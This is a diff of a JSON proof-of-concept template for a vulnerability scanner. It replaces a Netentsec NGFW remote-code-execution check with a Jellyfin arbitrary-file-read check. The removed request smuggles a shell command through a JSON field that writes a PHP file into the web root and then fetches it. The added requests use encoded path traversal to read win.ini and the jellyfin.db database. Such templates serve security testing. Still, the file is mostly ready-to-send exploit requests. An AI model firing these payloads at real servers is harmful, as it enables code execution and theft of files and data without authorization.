@@ -1,15 +1,15 @@
 {
-    "Name": "netentsec-ngfw-rce",
-    "Description": "netentsec-ngfw-rce",
-    "Product": "Netentsec",
+    "Name": "Jellyfin Arbitrary File Read Vulnerability",
+    "Description": "Jellyfin Arbitrary File Read Vulnerability",
+    "Product": "Jellyfin",
     "author": "chumeng",
     "Request":[
         {
-        "Method": "POST",
+        "Method": "GET",
         "Header": {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36"},
-        "Uri":"/directdata/direct/router",
+        "Uri":"/Audio/1/hls/..%5C..%5C..%5C..%5C..%5C..%5CWindows%5Cwin.ini/stream.mp3/",
         "Port":"",
-        "Data":"{\"action\":\"SSLVPN_Resource\",\"method\":\"deleteImage\",\"data\":[{\"data\":[\"/var/www/html/d.txt;echo '<?php echo md5(123);unlink(__FILE__);?>' >/var/www/html/chumeng.php\"]}],\"type\":\"rpc\",\"tid\":17}",
+        "Data":"",
         "Follow_redirects":"false",
         "Upload":{"Name": "","fileName": "","filePath": "" },
         "Response":{
@@ -18,13 +18,8 @@
                 {
                 "Operation": "contains", 
                 "Key":"",
-                "Value": "SSLVPN_Resource"
+                "Value": "for 16-bit app support"
                 },
-                {
-                 "Operation": "contains", 
-                 "Key":"",
-                 "Value": "\"result\":{\"success\":true}"
-                 },
                  {
                 "Operation": "code", 
                 "Key":"",
@@ -32,11 +27,12 @@
                  }
         ]
         },
-        "Next_decide":"AND"
-                }, {
+        "Next_decide":"OR"
+                },
+                {
                     "Method": "GET",
                     "Header": {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36"},
-                    "Uri":"/chumeng.php",
+                    "Uri":"/Videos/anything/hls/m/..%5Cdata%5Cjellyfin.db",
                     "Port":"",
                     "Data":"",
                     "Follow_redirects":"false",
@@ -47,7 +43,7 @@
                             {
                             "Operation": "contains", 
                             "Key":"",
-                            "Value": "202cb962ac59075b964b07152d234b70"
+                            "Value": "SQLite"
                             },
                              {
                             "Operation": "code", 
